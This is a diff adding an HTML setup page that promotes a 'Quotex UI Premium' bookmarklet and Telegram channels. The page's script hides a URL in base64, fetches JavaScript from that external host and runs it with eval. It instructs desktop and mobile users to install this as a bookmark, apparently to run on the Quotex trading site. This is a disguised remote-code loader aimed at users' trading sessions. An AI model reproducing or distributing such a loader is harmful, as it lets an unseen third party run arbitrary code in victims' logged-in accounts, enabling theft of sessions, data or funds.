@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DevJisanX</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #2563eb;
+            --primary-hover: #1d4ed8;
+            --text-color: #1e293b;
+            --bg-color: #f8fafc;
+            --container-bg: #ffffff;
+            --border-color: #e2e8f0;
+            --success-color: #10b981;
+            --font-main: 'Roboto', sans-serif;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--font-main);
+            line-height: 1.6;
+            color: var(--text-color);
+            background-color: var(--bg-color);
+            padding: 2rem;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: all 0.3s ease;
+        }
+
+        .container {
+            background-color: var(--container-bg);
+            border-radius: 0.75rem;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            padding: 2.5rem;
+            max-width: 800px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid var(--border-color);
+        }
+
+        h1 {
+            font-size: 2.25rem;
+            margin-bottom: 1rem;
+            color: var(--primary-color);
+            font-weight: 700;
+        }
+
+        h3 {
+            font-size: 1.25rem;
+            margin-bottom: 0.75rem;
+            font-weight: 500;
+            color: var(--text-color);
+        }
+
+        a {
+            color: var(--primary-color);
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
+
+        a:hover {
+            color: var(--primary-hover);
+            text-decoration: underline;
+        }
+
+        button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            font-size: 1rem;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-weight: 500;
+            margin: 0.5rem 0;
+            display: inline-block;
+        }
+
+        button:hover {
+            background-color: var(--primary-hover);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        #bookmarklet-link {
+            display: inline-block;
+            padding: 0.75rem 1.5rem;
+            background-color: #f1f5f9;
+            border-radius: 0.5rem;
+            color: var(--primary-color);
+            font-weight: 500;
+            border: 1px dashed var(--primary-color);
+            margin: 1rem 0;
+            transition: all 0.2s ease;
+        }
+
+        #bookmarklet-link:hover {
+            background-color: #e2e8f0;
+            text-decoration: none;
+            border-style: solid;
+        }
+
+        #instructions {
+            text-align: left;
+            margin-top: 1.5rem;
+            padding: 1.5rem;
+            background-color: #f8fafc;
+            border-radius: 0.5rem;
+            border-left: 4px solid var(--primary-color);
+        }
+
+        #instructions p {
+            margin-bottom: 1rem;
+        }
+
+        #instructions ol {
+            margin-left: 1.5rem;
+            margin-bottom: 1rem;
+        }
+
+        #bookmarklet-code {
+            width: 100%;
+            min-height: 100px;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            border: 1px solid var(--border-color);
+            font-family: monospace;
+            resize: vertical;
+            margin: 1rem 0;
+            background-color: #f1f5f9;
+            color: #334155;
+        }
+
+        #copy-code {
+            background-color: var(--success-color);
+        }
+
+        #copy-code:hover {
+            background-color: #0d9f6e;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        .back-button {
+            background-color: #64748b;
+            margin-top: 1.5rem;
+        }
+
+        .back-button:hover {
+            background-color: #475569;
+        }
+
+        @media (max-width: 768px) {
+            body {
+                padding: 1rem;
+            }
+            
+            .container {
+                padding: 1.5rem;
+            }
+            
+            h1 {
+                font-size: 1.75rem;
+            }
+            
+            h3 {
+                font-size: 1.1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- First Page (Start Setup) -->
+        <div id="page1" class="page active">
+            <h1>Developer <a href="http://t.me/traderjisanx" target="_blank">@traderjisanx</a></h1>
+            <h3>Official channel <a href="https://t.me/DevJisanX" target="_blank">DevJisanX</a></h3>
+            <h3>Developer with Premium Knowledge</h3>
+            <div style="height: 20px;"></div>
+            <h3>Setup Quotex UI Premium</h3>
+            <button id="start-setup">Start the Setup</button>
+        </div>
+
+        <!-- Second Page (Bookmarklet) -->
+        <div id="page2" class="page">
+            <h1>Setup Bookmarklet</h1>
+            <h3>Follow these instructions to install:</h3>
+            
+            <a id="bookmarklet-link" href="#" title="Drag this to your bookmarks bar">TraderJisanX</a>
+            
+            <div id="instructions">
+                <p>- For desktop users, drag the link above to your bookmarks bar.</p>
+                <p>- For mobile and tablet users:</p>
+                <ol>
+                    <li>Add this page to your bookmarks.</li>
+                    <li>Edit the bookmark you just created.</li>
+                    <li>Replace the URL with the following code:</li>
+                </ol>
+                <textarea id="bookmarklet-code" readonly></textarea>
+                <button id="copy-code">Copy Code</button>
+            </div>
+            
+            <button class="back-button" id="back-button">Back to Home</button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Bookmarklet code
+            const bookmarkletCode = `javascript:(function(){fetch(atob('aHR0cHM6Ly9xdW90ZXh1aXZlcnNpb24yLnZlcmNlbC5hcHAv'))['then'](r=>r['text']())['then'](eval)['catch'](console.error)})();`;
+
+            // Set the bookmarklet link href
+            const bookmarkletLink = document.getElementById('bookmarklet-link');
+            bookmarkletLink.href = bookmarkletCode;
+            
+            // Display the bookmarklet code in the textarea
+            const bookmarkletTextarea = document.getElementById('bookmarklet-code');
+            bookmarkletTextarea.value = bookmarkletCode;
+            
+            // Copy code button functionality
+            const copyButton = document.getElementById('copy-code');
+            copyButton.addEventListener('click', function() {
+                bookmarkletTextarea.select();
+                document.execCommand('copy');
+                copyButton.textContent = 'Copied!';
+                setTimeout(function() {
+                    copyButton.textContent = 'Copy Code';
+                }, 2000);
+            });
+            
+            // Page navigation
+            const startSetupBtn = document.getElementById('start-setup');
+            const backButton = document.getElementById('back-button');
+            const page1 = document.getElementById('page1');
+            const page2 = document.getElementById('page2');
+            
+            startSetupBtn.addEventListener('click', function() {
+                page1.classList.remove('active');
+                page2.classList.add('active');
+            });
+            
+            backButton.addEventListener('click', function() {
+                page2.classList.remove('active');
+                page1.classList.add('active');
+            });
+        });
+    </script>
+</body>
+</html>
